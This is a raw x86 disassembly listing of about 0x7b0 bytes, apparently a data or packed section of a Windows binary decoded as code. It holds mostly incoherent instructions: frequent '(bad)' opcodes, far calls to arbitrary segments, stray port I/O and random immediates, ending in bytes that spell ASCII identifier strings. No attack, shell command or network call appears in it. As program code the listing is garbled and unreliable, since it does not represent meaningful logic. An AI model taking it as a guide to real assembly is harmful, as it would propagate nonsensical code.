  4230e4:	add    DWORD PTR [eax],eax
  4230e6:	arpl   WORD PTR [eax],ax
  4230e8:	add    BYTE PTR [eax],al
  4230ea:	adc    al,0xa4
  4230ec:	(bad)
  4230f0:	and    al,0x87
  4230f2:	ins    BYTE PTR es:[edi],dx
  4230f3:	out    dx,eax
  4230f4:	xchg   edi,eax
  4230f5:	pop    edx
  4230f6:	sub    BYTE PTR [edx*8+0x7c4e17c6],0xef
  4230fe:	cmc    
  4230ff:	std    
  423100:	and    eax,0x7d534b54
  423105:	xchg   esi,eax
  423106:	push   eax
  423107:	mov    edx,0x77eac378
  42310c:	xlat   BYTE PTR ds:[ebx]
  42310d:	add    eax,0xbb17404f
  423112:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423113:	inc    esi
  423114:	fs and al,0x75
  423117:	cmp    al,0xd3
  423119:	add    ecx,esi
  42311b:	ret    
  42311c:	call   0x2848:0x4ad62a14
  423123:	cmp    BYTE PTR [edi],bh
  423125:	lea    edx,ds:0xa458ae72
  42312b:	cs inc edx
  42312d:	loopne 0x423148
  42312f:	xor    edi,esp
  423131:	mov    eax,ds:0xe135ba86
  423136:	lods   eax,DWORD PTR ds:[esi]
  423137:	inc    esp
  423138:	add    DWORD PTR [ebx*1-0x22e4384b],0xfc410d70
  423143:	ror    al,0xd
  423146:	jp     0x4230e2
  423148:	and    eax,0x230f5ce2
  42314d:	add    BYTE PTR [eax],al
  42314f:	add    BYTE PTR [eax],al
  423151:	add    BYTE PTR [esi],dh
  423153:	arpl   WORD PTR [eax-0x10],bp
  423156:	jge    0x423153
  423158:	mov    esi,0x8c7853e7
  42315d:	daa    
  42315e:	(bad)
  423162:	mov    edi,0x630001d6
  423167:	add    BYTE PTR [eax],al
  423169:	add    BYTE PTR [ebp+0x4d],cl
  42316c:	fisubr WORD PTR cs:[edx+0x55]
  423170:	mov    ds,WORD PTR [eax+0x64]
  423173:	mov    dl,0xc
  423175:	mov    eax,DWORD PTR [eax]
  423177:	add    ch,bl
  423179:	in     al,0xbe
  42317b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42317c:	int    0xab
  42317e:	jp     0x423123
  423180:	es adc ebx,ecx
  423183:	cmc    
  423184:	aaa    
  423185:	xchg   esi,eax
  423186:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423187:	pop    ecx
  423188:	push   ebp
  423189:	adc    esp,DWORD PTR fs:[ebp+ecx*8+0x810b865]
  423191:	pop    ss
  423192:	mov    BYTE PTR [ecx+0xf7e6389],bh
  423198:	dec    edx
  423199:	(bad)  
  42319a:	sti    
  42319b:	mov    ds:0x94838cb9,eax
  4231a0:	cli    
  4231a1:	movups XMMWORD PTR [edi+0x51d2eefb],xmm4
  4231a8:	jnp    0x423212
  4231aa:	adc    al,0xf3
  4231ac:	aad    0xd3
  4231ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4231af:	inc    esp
  4231b0:	leave  
  4231b1:	xor    eax,0x335da805
  4231b6:	xchg   edi,eax
  4231b7:	pushf  
  4231b8:	pop    ebp
  4231b9:	ret    0xed0c
  4231bc:	cld    
  4231bd:	push   edi
  4231be:	(bad)  
  4231bf:	cmp    BYTE PTR [edi+0x49cb95cd],ah
  4231c5:	out    dx,eax
  4231c6:	pop    esp
  4231c7:	mov    bh,cl
  4231c9:	sub    esp,DWORD PTR [edx]
  4231cb:	jb     0x4231c1
  4231cd:	add    BYTE PTR [eax],al
  4231cf:	add    BYTE PTR [eax],al
  4231d1:	add    BYTE PTR [edi],ah
  4231d3:	push   ecx
  4231d4:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  4231de:	mov    esi,ebx
  4231e0:	outs   dx,DWORD PTR ds:[esi]
  4231e1:	dec    eax
  4231e2:	sbb    dh,bl
  4231e4:	add    DWORD PTR [eax],eax
  4231e6:	arpl   WORD PTR [eax],ax
  4231e8:	add    BYTE PTR [eax],al
  4231ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4231eb:	add    BYTE PTR [edi],dl
  4231ed:	mov    bh,0xa7
  4231ef:	cmp    dl,BYTE PTR ds:0x4800b8cf
  4231f5:	fistp  WORD PTR [eax+0x389187e5]
  4231fb:	arpl   WORD PTR [ecx-0x6f],dx
  4231fe:	test   al,0xfe
  423200:	mov    gs:0xe4d35879,eax
  423206:	or     ebx,DWORD PTR ds:0x9a32956
  42320c:	mov    eax,0x98b27648
  423211:	cld    
  423212:	out    dx,eax
  423213:	dec    ebx
  423214:	int    0x97
  423216:	xchg   ebx,eax
  423217:	mov    DWORD PTR [esi-0x2134f86a],0x6bb46be6
  423221:	mov    sp,0x6742
  423225:	jecxz  0x42325f
  423227:	jns    0x42327b
  423229:	mov    dh,0x8d
  42322b:	retf   0xa2ee
  42322e:	cmp    eax,0xaa3dbb68
  423233:	fisub  DWORD PTR [ebp-0x7bad4182]
  423239:	xchg   edi,eax
  42323a:	pop    ds
  42323b:	xchg   esi,eax
  42323c:	xor    BYTE PTR [eax+ebp*4-0x5fffa375],dl
  423243:	push   es
  423244:	or     al,0x34
  423246:	cmp    ah,al
  423248:	cmp    DWORD PTR [edx+0xca0443],ebp
  42324e:	add    BYTE PTR [eax],al
  423250:	add    BYTE PTR [eax],al
  423252:	daa    
  423253:	ss lahf 
  423255:	xor    DWORD PTR [edi+0x1536afb9],ebx
  42325b:	and    eax,0xaa06075b
  423260:	pop    esp
  423261:	pop    esp
  423262:	jnp    0x423242
  423264:	add    DWORD PTR [eax],eax
  423266:	arpl   WORD PTR [eax],ax
  423268:	add    BYTE PTR [eax],al
  42326a:	cwde   
  42326b:	in     al,dx
  42326c:	hlt    
  42326d:	push   ebp
  42326e:	out    0xb6,al
  423270:	mov    ah,0x3d
  423272:	inc    edi
  423273:	or     edi,ecx
  423275:	adc    edi,esp
  423277:	pop    edi
  423278:	repz add DWORD PTR [edx+0x6a172ae2],edi
  42327f:	sbb    al,0x3f
  423281:	aas    
  423282:	inc    esp
  423283:	mov    di,0xf7c5
  423287:	mov    bl,0xa
  423289:	in     eax,0x3d
  42328b:	cmc    
  42328c:	inc    ebx
  42328d:	in     al,dx
  42328e:	push   edi
  42328f:	dec    ecx
  423290:	jmp    0x72d1:0x7e5f71d5
  423297:	mov    ebp,0x3446c0a0
  42329c:	inc    edi
  42329d:	mov    al,ds:0x6b986276
  4232a2:	fmul   DWORD PTR [ecx+0x47]
  4232a5:	sbb    al,0xc4
  4232a7:	xor    eax,0x88919462
  4232ac:	fwait
  4232ad:	sti    
  4232ae:	gs es or al,0xb2
  4232b2:	pop    esi
  4232b3:	mov    bh,0xa9
  4232b5:	mov    al,BYTE PTR [ecx-0x73]
  4232b8:	aaa    
  4232b9:	jmp    0x69230fe5
  4232be:	mov    al,0xb1
  4232c0:	repz add BYTE PTR [ecx-0xacc2a82],ah
  4232c7:	push   0x0
  4232c9:	push   ecx
  4232ca:	rep lods al,BYTE PTR ds:[esi]
  4232cc:	bound  eax,QWORD PTR [eax]
  4232ce:	add    BYTE PTR [eax],al
  4232d0:	add    BYTE PTR [eax],al
  4232d2:	aaa    
  4232d3:	(bad)  
  4232d4:	out    0xc2,eax
  4232d6:	mul    ebx
  4232d8:	aaa    
  4232d9:	cmc    
  4232da:	xchg   ecx,eax
  4232db:	call   0xd9c8:0xa890eef4
  4232e2:	(bad)  
  4232e4:	add    DWORD PTR [eax],eax
  4232e6:	arpl   WORD PTR [eax],ax
  4232e8:	add    BYTE PTR [eax],al
  4232ea:	scas   al,BYTE PTR es:[edi]
  4232eb:	retf   
  4232ec:	mov    dh,0x57
  4232ee:	cli    
  4232ef:	inc    ebp
  4232f0:	mov    al,0xcc
  4232f2:	lock in eax,0xdb
  4232f5:	mov    bh,0xe2
  4232f7:	xchg   edi,eax
  4232f8:	(bad)  
  4232f9:	adc    dl,BYTE PTR [eax]
  4232fb:	dec    eax
  4232fc:	cmp    BYTE PTR ss:[esi-0x6162b4da],bh
  423303:	jl     0x4232ba
  423305:	dec    esp
  423306:	ficom  WORD PTR [edi+0x61]
  423309:	jns    0x423349
  42330b:	(bad)  
  42330d:	mov    eax,0x3f469814
  423312:	outs   dx,DWORD PTR ds:[esi]
  423313:	dec    ebp
  423314:	jmp    0x423335
  423316:	add    eax,0x2f1f03e9
  42331b:	pop    ebp
  42331c:	inc    edi
  42331d:	push   ss
  42331e:	mov    WORD PTR [ebx+eax*4],es
  423321:	int3   
  423322:	in     al,dx
  423323:	popa   
  423324:	cld    
  423325:	cmp    al,0x8e
  423327:	es cmp al,0xc6
  42332a:	mov    ds:0x71883ba7,al
  42332f:	sub    BYTE PTR [esi-0xe],ah
  423332:	jl     0x4232db
  423334:	add    bl,BYTE PTR [ebp-0x5c]
  423337:	inc    esi
  423338:	mov    al,ds:0x7bcf8765
  42333d:	icebp  
  42333e:	int    0xbb
  423340:	add    DWORD PTR [esi+ebp*2+0x22764c56],ebp
  423347:	cmp    esp,DWORD PTR [eax+0x70]
  42334a:	and    al,0xdf
  42334c:	or     eax,0x0
  423351:	add    BYTE PTR [esi],dl
  423353:	aad    0xdf
  423355:	out    dx,eax
  423356:	fucomip st,st(7)
  423358:	ss std 
  42335a:	cmp    BYTE PTR [esi-0x158fa0c6],al
  423360:	dec    edi
  423361:	sbb    eax,DWORD PTR [ecx-0x21]
  423364:	add    DWORD PTR [eax],eax
  423366:	arpl   WORD PTR [eax],ax
  423368:	add    BYTE PTR [eax],al
  42336a:	sbb    dl,BYTE PTR [edx+0x5dd1a6f3]
  423370:	lahf   
  423371:	cmp    ecx,DWORD PTR [edi+0x30cd587a]
  423377:	sub    al,0xa4
  423379:	mov    cl,0x18
  42337b:	icebp  
  42337c:	jmp    0x423379
  42337e:	out    0x8f,eax
  423380:	scas   eax,DWORD PTR es:[edi]
  423381:	ret    0xcfa1
  423384:	jb     0x423311
  423386:	enter  0x5b25,0xf
  42338a:	inc    eax
  42338b:	lds    ebx,FWORD PTR [esi+0x1bf17817]
  423391:	les    edx,FWORD PTR [eax+ebp*4+0x1e]
  423395:	dec    ebp
  423396:	sbb    BYTE PTR [ecx+0x7d40391f],dh
  42339c:	mov    esp,0xc06880eb
  4233a1:	in     eax,dx
  4233a2:	dec    edx
  4233a3:	mov    edi,0x75defb72
  4233a8:	sub    esp,DWORD PTR gs:[ebx+0xf]
  4233ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4233ad:	mov    eax,0x1af80078
  4233b2:	shl    dl,0x6
  4233b5:	jge    0x4233bc
  4233b7:	inc    ecx
  4233b8:	jg     0x423378
  4233ba:	fld    TBYTE PTR [esi]
  4233bc:	jb     0x4233a1
  4233be:	mov    bh,0x97
  4233c0:	add    cl,ch
  4233c2:	aam    0x40
  4233c4:	std    
  4233c5:	and    al,0xd3
  4233c7:	jle    0x4233b6
  4233c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4233ca:	jmp    0x42645f
  4233cf:	add    BYTE PTR [eax],al
  4233d1:	add    BYTE PTR [esi+0x76],ch
  4233d4:	in     al,0xca
  4233d6:	cld    
  4233d7:	fisubr DWORD PTR [esi-0xa]
  4233da:	sbb    BYTE PTR [edx-0x74106879],dl
  4233e0:	pop    esi
  4233e1:	scas   eax,DWORD PTR es:[edi]
  4233e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233e3:	fild   WORD PTR [ecx]
  4233e5:	add    BYTE PTR [ebx+0x0],ah
  4233e8:	add    BYTE PTR [eax],al
  4233ea:	mov    ebx,eax
  4233ec:	test   al,0x5d
  4233ee:	sbb    ah,BYTE PTR [edi+0x73d14582]
  4233f4:	les    edi,FWORD PTR [eax-0x42]
  4233f7:	popf   
  4233f8:	mov    ds:0x5fd7764,al
  4233fd:	dec    edx
  4233fe:	cmc    
  4233ff:	pop    edx
  423400:	retf   0x5d32
  423403:	mov    al,ds:0x6d6346f1
  423408:	leave  
  423409:	xchg   dh,bl
  42340b:	and    DWORD PTR [edi+0x411294ba],ecx
  423411:	pop    es
  423412:	test   BYTE PTR [esi-0x30],0x9f
  423416:	call   0x5443a1d5
  42341b:	xor    al,0xd
  42341d:	inc    ebp
  42341e:	cld    
  42341f:	into   
  423420:	pop    ecx
  423421:	cmp    bl,BYTE PTR [ecx+0x4c]
  423424:	or     eax,0x58d7324c
  423429:	dec    ebp
  42342a:	sub    al,0xd1
  42342c:	(bad)
  423430:	leave  
  423431:	mov    bl,0x49
  423433:	mov    ds:0xd57e2e86,al
  423438:	xchg   esp,eax
  423439:	or     ch,BYTE PTR [edi+0x9e53576]
  42343f:	sbb    bl,BYTE PTR [edx+0x34]
  423442:	inc    esp
  423443:	mov    cl,0xbf
  423445:	call   0x275f1da2
  42344a:	pop    ebx
  42344b:	mov    eax,ds:0x16
  423450:	add    BYTE PTR [eax],al
  423452:	cmp    dl,BYTE PTR [edx-0x3c]
  423455:	paddsb mm3,QWORD PTR [edi-0x2e098805]
  42345c:	nop
  42345d:	rol    ebp,cl
  42345f:	pop    ebp
  423460:	wbinvd 
  423462:	pop    es
  423463:	loopne 0x423466
  423465:	add    BYTE PTR [ebx+0x0],ah
  423468:	add    BYTE PTR [eax],al
  42346a:	out    0x3,al
  42346c:	(bad)  
  42346d:	or     esp,DWORD PTR [esp+eiz*4-0x71ce11a8]
  423474:	stc    
  423475:	adc    ah,BYTE PTR [edi]
  423477:	add    DWORD PTR [ecx+0x79],esp
  42347a:	push   ss
  42347b:	inc    esi
  42347c:	daa    
  42347d:	adc    esi,0x79
  423480:	pushf  
  423481:	mov    fs,WORD PTR [edi+0x1425eff1]
  423487:	shl    bl,0x31
  42348a:	mov    ah,0xed
  42348c:	adc    ah,0xab
  42348f:	mov    esp,ecx
  423491:	pop    esi
  423492:	push   esi
  423493:	mov    cl,0xe8
  423495:	ins    DWORD PTR es:[edi],dx
  423496:	sahf   
  423497:	psrlq  mm3,mm3
  42349a:	(bad)  
  42349c:	dec    eax
  42349d:	and    BYTE PTR [ebx+0x57ebda21],bh
  4234a3:	scas   al,BYTE PTR es:[edi]
  4234a4:	xchg   edx,eax
  4234a5:	test   al,0x2a
  4234a7:	std    
  4234a8:	iret   
  4234a9:	xchg   edi,eax
  4234aa:	sbb    dl,BYTE PTR [esi]
  4234ac:	stc    
  4234ad:	jne    0x4234a0
  4234af:	loope  0x4234b6
  4234b1:	ja     0x4234d3
  4234b3:	test   BYTE PTR [ebx+0x4f1a5860],ah
  4234b9:	(bad)  
  4234ba:	int    0x9e
  4234bc:	repz popa 
  4234be:	pop    esi
  4234bf:	stos   BYTE PTR es:[edi],al
  4234c0:	nop
  4234c1:	(bad)  
  4234c2:	(bad)  
  4234c4:	leave  
  4234c5:	data16 and BYTE PTR [edx-0x123a3af4],dl
  4234cc:	outs   dx,BYTE PTR ds:[esi]
  4234cd:	add    BYTE PTR [eax],al
  4234cf:	add    BYTE PTR [eax],al
  4234d1:	add    BYTE PTR [ebx-0x4293427d],dl
  4234d7:	jle    0x4234ac
  4234d9:	call   DWORD PTR [eax-0x20]
  4234dc:	cli    
  4234dd:	call   0xe06a:0x1c7faa70
  4234e4:	add    DWORD PTR [eax],eax
  4234e6:	arpl   WORD PTR [eax],ax
  4234e8:	add    BYTE PTR [eax],al
  4234ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4234eb:	and    BYTE PTR [eax],al
  4234ed:	mov    edi,0xdd096a9b
  4234f2:	retf   0x9af7
  4234f5:	lds    esp,FWORD PTR [ebx-0x2e7c67b2]
  4234fb:	dec    esi
  4234fc:	aam    0xfc
  4234fe:	adc    BYTE PTR [esi-0x69],bl
  423501:	hlt    
  423502:	or     al,0x95
  423504:	push   edx
  423505:	sub    ch,0x5a
  423508:	mov    bh,bl
  42350a:	xchg   edx,eax
  42350b:	sbb    DWORD PTR [ecx+0x2183d93f],edi
  423511:	loopne 0x423547
  423513:	xchg   edi,eax
  423514:	je     0x4234dc
  423516:	aaa    
  423517:	mov    cl,0x75
  423519:	push   ecx
  42351a:	jmp    0xb872:0x6ac4615e
  423521:	call   0x7ae2:0x29fb5171
  423528:	xchg   edx,eax
  423529:	and    eax,0x292d906d
  42352e:	iret   
  42352f:	pop    ebp
  423530:	test   BYTE PTR [ebp-0x1],al
  423533:	push   ecx
  423534:	js     0x423531
  423536:	sahf   
  423537:	sahf   
  423538:	int    0x17
  42353a:	ins    BYTE PTR es:[edi],dx
  42353b:	xchg   ebp,eax
  42353c:	pushf  
  42353d:	dec    esi
  42353e:	daa    
  42353f:	push   0xf70d74c2
  423544:	lea    ebx,[ebp-0x26]
  423547:	mov    bl,0x35
  423549:	sbb    eax,0x381888
  42354e:	add    BYTE PTR [eax],al
  423550:	add    BYTE PTR [eax],al
  423552:	(bad)  
  423554:	test   eax,0xddffeef7
  42355a:	and    al,0x1
  42355c:	pop    ebp
  42355d:	dec    edi
  42355e:	sub    DWORD PTR [ebp-0x1f321596],esi
  423564:	add    DWORD PTR [eax],eax
  423566:	arpl   WORD PTR [eax],ax
  423568:	add    BYTE PTR [eax],al
  42356a:	aaa    
  42356b:	add    al,0x51
  42356d:	mov    eax,0xb3adaa8a
  423572:	xor    DWORD PTR [edx+0x41],ebx
  423575:	in     al,0x5c
  423577:	mov    BYTE PTR [edi-0x44554a7f],0x6b
  42357e:	shr    DWORD PTR [ecx+0xb],0x4f
  423582:	push   eax
  423583:	jl     0x42353c
  423585:	aaa    
  423586:	pop    edx
  423588:	pop    ebx
  423589:	add    esp,DWORD PTR [ecx-0x6b]
  42358c:	xor    eax,0x3c7d8130
  423591:	push   ecx
  423592:	push   ebp
  423593:	aam    0xc3
  423595:	cli    
  423596:	jle    0x4235c4
  423598:	mov    bh,BYTE PTR [ebx+0x3e]
  42359b:	sbb    DWORD PTR [ecx-0x69e330d6],ebp
  4235a1:	xor    DWORD PTR [edx],ebx
  4235a3:	jle    0x423592
  4235a5:	add    eax,0x77c15c0a
  4235aa:	and    eax,DWORD PTR [ecx+0x21]
  4235ad:	loop   0x423611
  4235af:	and    BYTE PTR [ebp+0x5b],0x2b
  4235b3:	stc    
  4235b4:	call   0xc3431e89
  4235b9:	push   ebp
  4235ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4235bb:	inc    esi
  4235bc:	sbb    cl,dl
  4235be:	mov    esp,0xaa3745a0
  4235c3:	cli    
  4235c4:	neg    BYTE PTR [ebp-0x3c7ae90d]
  4235ca:	out    dx,al
  4235cb:	icebp  
  4235cc:	cdq    
  4235cd:	add    BYTE PTR [eax],al
  4235cf:	add    BYTE PTR [eax],al
  4235d1:	add    BYTE PTR [edi-0x5e],ch
  4235d4:	aam    0x2a
  4235d6:	fnstsw WORD PTR [esi-0x1]
  4235d9:	out    0x52,eax
  4235db:	fcmovu st,st(5)
  4235dd:	in     eax,0x98
  4235df:	jbe    0x42362e
  4235e1:	lea    esi,[eax]
  4235e3:	loope  0x4235e6
  4235e5:	add    BYTE PTR [ebx+0x0],ah
  4235e8:	add    BYTE PTR [eax],al
  4235ea:	pop    ebp
  4235eb:	mov    ah,0x11
  4235ed:	mov    ds:0x32a1b4ae,al
  4235f2:	jmp    0x2942e1c7
  4235f7:	dec    edx
  4235f8:	pmulhuw mm0,QWORD PTR [edx-0x5ce84e15]
  4235ff:	or     dl,BYTE PTR ds:0xf5b86085
  423605:	push   es
  423606:	std    
  423607:	into   
  423608:	sbb    eax,0x93d95e46
  42360d:	jg     0x423593
  42360f:	xor    eax,0x2a94f7d3
  423614:	repnz add al,0x5c
  423617:	add    DWORD PTR [edx],0x3b6ef478
  42361d:	xchg   DWORD PTR [esi+0x5382a9d],eax
  423623:	xlat   BYTE PTR ds:[ebx]
  423624:	or     edx,edx
  423626:	xchg   edx,ebp
  423628:	adc    BYTE PTR [eax+0x698d0b93],bl
  42362e:	hlt    
  42362f:	hlt    
  423630:	fld    st(1)
  423632:	pop    ecx
  423633:	jle    0x423620
  423635:	inc    ebx
  423636:	fbld   TBYTE PTR [esi-0x34aacbed]
  42363c:	mov    esi,0x78889251
  423641:	push   edx
  423642:	xor    al,0x2
  423644:	pop    ds
  423645:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423646:	push   ss
  423647:	or     eax,0x238184f5
  42364c:	retf   
  42364d:	add    BYTE PTR [eax],al
  42364f:	add    BYTE PTR [eax],al
  423651:	add    cl,bh
  423653:	sbb    al,al
  423655:	inc    esi
  423656:	jecxz  0x423636
  423658:	(bad)  
  423659:	mov    edi,0xe1f1bc83
  42365e:	popf   
  42365f:	inc    ecx
  423660:	popa   
  423661:	fcom   DWORD PTR [ebx+0x630001e1]
  423667:	add    BYTE PTR [eax],al
  423669:	add    BYTE PTR [edi+0x5e],bl
  42366c:	pop    es
  42366d:	or     DWORD PTR [ecx],edx
  42366f:	ret    
  423670:	stc    
  423671:	rcl    BYTE PTR [eax],1
  423673:	pop    ebp
  423674:	(bad)  
  423676:	lahf   
  423677:	div    edi
  423679:	adc    eax,0xc65b9467
  42367e:	sahf   
  42367f:	adc    eax,0x8a4912cc
  423684:	and    BYTE PTR [ebx+0x5abcaf52],bl
  42368a:	aam    0x1e
  42368c:	cmc    
  42368d:	pushf  
  42368e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42368f:	mov    bl,0xe3
  423691:	in     eax,dx
  423692:	pop    ebp
  423693:	cmp    DWORD PTR [esi-0x11db6478],ebx
  423699:	jbe    0x423652
  42369b:	(bad)
  42369e:	sub    BYTE PTR ds:0x47558713,0x1a
  4236a5:	in     al,0xdd
  4236a7:	pop    ecx
  4236a8:	outs   dx,BYTE PTR ds:[esi]
  4236a9:	pop    ss
  4236aa:	xchg   ecx,eax
  4236ab:	leave  
  4236ac:	sbb    eax,0xf27800
  4236b1:	sbb    eax,DWORD PTR [eax+0x3a]
  4236b4:	loope  0x4236fb
  4236b6:	or     eax,0x373f89bb
  4236bb:	adc    al,0xe0
  4236bd:	repnz mov dh,0xbf
  4236c0:	bound  eax,QWORD PTR [edi+0x76574824]
  4236c6:	push   ebp
  4236c7:	je     0x423653
  4236c9:	xor    eax,0x67b506
  4236ce:	add    BYTE PTR [eax],al
  4236d0:	add    BYTE PTR [eax],al
  4236d2:	mov    eax,ds:0x3e8336b9
  4236d7:	(bad)  
  4236d8:	mov    ch,0xbb
  4236da:	icebp  
  4236db:	and    eax,0x620d8c27
  4236e0:	scas   al,BYTE PTR es:[edi]
  4236e1:	sub    esi,esi
  4236e3:	loope  0x4236e6
  4236e5:	add    BYTE PTR [ebx+0x0],ah
  4236e8:	add    BYTE PTR [eax],al
  4236ea:	lods   eax,DWORD PTR ds:[esi]
  4236eb:	xchg   ebp,eax
  4236ed:	mov    esi,?
  4236ef:	fsub   QWORD PTR [ecx]
  4236f1:	es icebp 
  4236f3:	(bad)  
  4236f5:	pop    ss
  4236f6:	push   ss
  4236f7:	sub    dh,BYTE PTR [eax-0xf]
  4236fa:	int    0x20
  4236fc:	mov    eax,esi
  4236fe:	imul   esp,DWORD PTR [ebp-0x6d],0xe8aca4c6
  423705:	mov    ds:0xd4558e7d,al
  42370a:	imul   ebp,DWORD PTR [edx+0x1f],0xffffff80
  42370e:	xor    DWORD PTR [ecx],ecx
  423710:	dec    esp
  423711:	and    BYTE PTR ds:0xf5471f17,ah
  423717:	push   ebx
  423718:	in     al,0x28
  42371a:	mov    ah,0x98
  42371c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42371d:	dec    esi
  42371e:	inc    ebx
  42371f:	pop    ecx
  423720:	inc    edi
  423721:	mov    ?,esi
  423723:	and    ecx,edx
  423725:	jne    0x4237a3
  423727:	and    ecx,ecx
  423729:	cwde   
  42372a:	mov    esp,0xdab384b4
  42372f:	adc    DWORD PTR [ebx],esi
  423731:	cdq    
  423732:	adc    BYTE PTR [ebp-0xc],ch
  423735:	jns    0x423794
  423737:	les    ecx,FWORD PTR [eax-0x9f2bd82]
  42373d:	rcl    DWORD PTR [ebx+0x3f27e872],1
  423743:	add    ecx,DWORD PTR [ebx-0x7b24cbe8]
  423749:	dec    di
  42374b:	push   esp
  42374c:	push   ds
  42374d:	add    BYTE PTR [eax],al
  42374f:	add    BYTE PTR [eax],al
  423751:	add    BYTE PTR [edx],dl
  423753:	xlat   BYTE PTR ds:[ebx]
  423754:	repz or esi,edi
  423757:	das    
  423758:	cli    
  423759:	fist   WORD PTR [ecx]
  42375b:	dec    ebx
  42375c:	es nop
  42375e:	inc    esp
  42375f:	inc    ecx
  423760:	add    eax,0x1e25987
  423765:	add    BYTE PTR [ebx+0x0],ah
  423768:	add    BYTE PTR [eax],al
  42376a:	mov    ebx,0x3c1aadf
  42376f:	call   0x728d:0x23a37a81
  423776:	add    BYTE PTR [ebp-0x34],dl
  423779:	xchg   ecx,eax
  42377a:	gs jmp edi
  42377d:	gs das 
  42377f:	mov    bh,0xe6
  423781:	cmp    eax,0x692d154d
  423786:	shr    eax,cl
  423788:	sub    al,0xaa
  42378a:	popa   
  42378b:	adc    dh,BYTE PTR [edi]
  42378d:	test   al,0x12
  42378f:	fimul  WORD PTR [edx-0x2e534556]
  423795:	stc    
  423796:	fnsave [ebx+0x54e970d9]
  42379c:	data16 je 0x4237ec
  42379f:	fcomp  QWORD PTR [eax]
  4237a1:	jecxz  0x4237c8
  4237a3:	mov    edi,0x31041c3d
  4237a8:	cmp    BYTE PTR [ecx-0x1571f2f7],ch
  4237ae:	popf   
  4237af:	dec    esp
  4237b0:	sti    
  4237b1:	xor    edx,DWORD PTR [ecx]
  4237b3:	and    BYTE PTR [esi],dl
  4237b5:	lahf   
  4237b6:	aad    0xe
  4237b8:	dec    edi
  4237b9:	jmp    0x4237c6
  4237bb:	inc    edi
  4237bc:	(bad)  
  4237be:	cmp    esi,DWORD PTR [eax]
  4237c0:	jbe    0x42376f
  4237c2:	pop    ebp
  4237c3:	inc    esi
  4237c4:	in     eax,0xcd
  4237c6:	push   ds
  4237c7:	imul   edx,DWORD PTR [ecx-0x4fb9773c],0x0
  4237ce:	add    BYTE PTR [eax],al
  4237d0:	add    BYTE PTR [eax],al
  4237d2:	add    al,al
  4237d4:	inc    edx
  4237d5:	add    BYTE PTR [eax+eax*8],al
  4237d8:	inc    edx
  4237d9:	add    BYTE PTR [eax],cl
  4237db:	rol    BYTE PTR [edx+0x0],0xc
  4237df:	rol    BYTE PTR [edx+0x0],0x10
  4237e3:	rol    BYTE PTR [edx+0x0],0x14
  4237e7:	rol    BYTE PTR [edx+0x0],0x18
  4237eb:	rol    BYTE PTR [edx+0x0],0x1c
  4237ef:	rol    BYTE PTR [edx+0x0],0x57
  4237f3:	inc    edi
  4237f4:	cmp    DWORD PTR [edi+0x41],ebx
  4237f7:	pop    eax
  4237f8:	ss push esi
  4237fa:	pop    edi
  4237fb:	cmp    BYTE PTR [eax],al
  4237fd:	inc    ebx
  4237fe:	inc    ebp
  4237ff:	dec    esp
  423800:	pop    edi
  423801:	pop    eax
  423802:	push   edi
  423803:	dec    eax
  423804:	inc    edx
  423805:	add    BYTE PTR [edi+0x50],dl
  423808:	xor    eax,0x4641365f
  42380d:	cmp    DWORD PTR [edx],esi
  42380f:	xor    ebx,DWORD PTR [edi+0x32]
  423812:	aaa    
  423813:	add    BYTE PTR [eax+0x48],dl
  423816:	xor    BYTE PTR [edi+0x58],bl
  423819:	push   esp
  42381a:	inc    ecx
  42381b:	dec    ebp
  42381c:	push   ecx
  42381d:	pop    edi
  42381e:	inc    esi
  42381f:	push   ebp
  423820:	cmp    DWORD PTR [eax],eax
  423822:	push   edi
  423823:	push   ebp
  423824:	inc    ecx
  423825:	xor    dh,BYTE PTR [ebx]
  423827:	xor    ebx,DWORD PTR [edi+0x4e]
  42382a:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  42382e:	cmp    DWORD PTR [edi+0x38],ebx
  423831:	dec    ecx
  423832:	cmp    DWORD PTR [edx+0x36],ebx
  423835:	pop    edi
  423836:	dec    edx
  423837:	xor    BYTE PTR [edx+0x34],cl
  42383a:	add    BYTE PTR [ecx+eax*2+0x34],cl
  42383e:	xor    esi,DWORD PTR [eax]
  423840:	pop    edi
  423841:	inc    edx
  423842:	dec    ebx
  423843:	pop    eax
  423844:	pop    eax
  423845:	xor    eax,0x51414d00
  42384a:	pop    edi
  42384b:	inc    ecx
  42384c:	xor    al,BYTE PTR [ebp+0x5f]
  42384f:	inc    ecx
  423850:	dec    ebx
  423851:	cmp    DWORD PTR ds:0x5a003939,esi
  423857:	inc    ebp
  423858:	cmp    BYTE PTR [edi+0x4d],bl
  42385b:	ss dec eax
  42385d:	dec    ebx
  42385e:	add    BYTE PTR [ebp+0x57],al
  423861:	xor    DWORD PTR [edi+0x31],ebx
  423864:	dec    ebx
  423865:	xor    eax,DWORD PTR [ecx+0x30]
  423868:	push   ebx
  423869:	add    BYTE PTR [edx+esi*1+0x36],al
  42386d:	aaa    
  42386e:	pop    edi
  42386f:	push   edx
  423870:	dec    eax
  423871:	dec    ebp
  423872:	cmp    BYTE PTR [edi+0x37],bl
  423875:	inc    esi
  423876:	xor    eax,0x43355500
  42387b:	pop    edi
  42387c:	pop    ecx
  42387d:	dec    ecx
  42387e:	push   ebx
  42387f:	xor    bl,BYTE PTR [edi+0x52]
  423882:	add    BYTE PTR [eax+0x55],dl
  423885:	dec    ecx
  423886:	xor    BYTE PTR [edi+0x43],bl
  423889:	ss inc ebp
  42388b:	xor    bl,BYTE PTR [edi+0x4d]
  42388e:	xor    al,0x4a
  423890:	push   edx
  423891:	push   ebp
  423892:	add    BYTE PTR [esi+0x39],cl
  423895:	push   eax
  423896:	pop    edi
  423897:	push   ebp
  423898:	cmp    DWORD PTR [esi],esi
